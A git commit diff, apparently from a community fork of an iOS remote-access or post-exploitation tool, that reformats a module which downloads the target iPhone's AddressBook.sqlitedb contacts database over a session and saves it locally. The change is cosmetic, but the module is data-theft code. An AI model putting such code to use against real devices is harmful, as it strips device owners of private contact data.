0790d750070c7be801e1124250f0b620ae915277
Luca <orksec@protonmail.com>
2021-03-23 13:44:15 +0100

    Added new ASCII Art and community fork title

--- modules/commands/iOS/getcontacts_ios.py
+++ modules/commands/iOS/getcontacts_ios.py
@@ -12,10 +12,8 @@ class command:
     def run(self, session, cmd_data):
         file_name = "AddressBook.sqlitedb"
         h.info_general("Downloading {0}".format(file_name))
-        data = session.download_file(
-            '/var/mobile/Library/AddressBook/'+file_name)
+        data = session.download_file('/var/mobile/Library/AddressBook/'+file_name)
         if data:
-            # save to downloads
             h.info_general("Saving {0}".format(file_name))
             f = open(os.path.join('downloads', file_name), 'wb')
             f.write(data)
